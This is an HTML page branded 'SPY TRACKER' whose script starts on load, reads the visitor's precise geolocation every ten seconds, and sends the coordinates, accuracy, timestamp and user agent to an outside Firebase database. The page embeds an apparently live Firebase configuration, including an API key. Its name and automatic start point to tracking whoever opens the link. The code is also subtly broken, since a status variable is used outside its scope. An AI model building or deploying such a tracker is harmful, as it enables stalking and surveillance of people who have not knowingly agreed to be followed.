<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpyTrack - Live Location</title>
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            background-color: #000; 
            color: #0f0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0;
        }
        .container { text-align: center; border: 1px solid #0f0; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px #0f0; }
        h1 { margin-bottom: 10px; }
        p { margin: 5px 0; }
        .status { font-size: 12px; opacity: 0.8; margin-top: 10px; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:hover { background: #fff; }
    </style>
</head>
<body>

    <div class="container">
        <h1>📍 SPY TRACKER</h1>
        <p id="lat">Lat: ---</p>
        <p id="lng">Lng: ---</p>
        <p id="acc">Accuracy: ---</p>
        <div class="status" id="status">Initializing...</div>
        <button onclick="window.location.reload()">Refresh</button>
    </div>

    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        // YOUR CONFIGURATION
        const firebaseConfig = {
            apiKey: "AIzaSyCna6y-9GZj0JRU13bZyxE2fy1hxBD_3D0",
            authDomain: "spyhere-data.firebaseapp.com",
            databaseURL: "https://spyhere-data-default-rtdb.firebaseio.com",
            projectId: "spyhere-data",
            storageBucket: "spyhere-data.firebasestorage.app",
            messagingSenderId: "1006192190791",
            appId: "1:1006192190791:web:3a2bad360add0f56615862"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let updateInterval;

        function startTracking() {
            const statusEl = document.getElementById('status');
            
            if (!navigator.geolocation) {
                statusEl.innerText = "Geolocation not supported.";
                return;
            }

            statusEl.innerText = "Waiting for signal...";

            // Update every 10 seconds
            updateInterval = setInterval(() => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        // Update UI
                        document.getElementById('lat').innerText = `Lat: ${lat.toFixed(6)}`;
                        document.getElementById('lng').innerText = `Lng: ${lng.toFixed(6)}`;
                        document.getElementById('acc').innerText = `Acc: ±${Math.round(accuracy)}m`;
                        statusEl.innerText = "Syncing to Cloud...";

                        // Send to Firebase
                        sendToFirebase(lat, lng, accuracy);
                    },
                    (error) => {
                        statusEl.innerText = "Error: " + error.message;
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }, 10000);
        }

        function sendToFirebase(lat, lng, acc) {
            const newLocationRef = push(ref(db, 'live_locations'));
            
            set(newLocationRef, {
                latitude: lat,
                longitude: lng,
                accuracy: acc,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            })
            .then(() => {
                statusEl.innerText = "Location Sent ✅";
            })
            .catch((error) => {
                console.error("Error:", error);
                statusEl.innerText = "Sync Failed ❌";
            });
        }

        // Start on load
        window.onload = startTracking;
    </script>

</body>
</html>
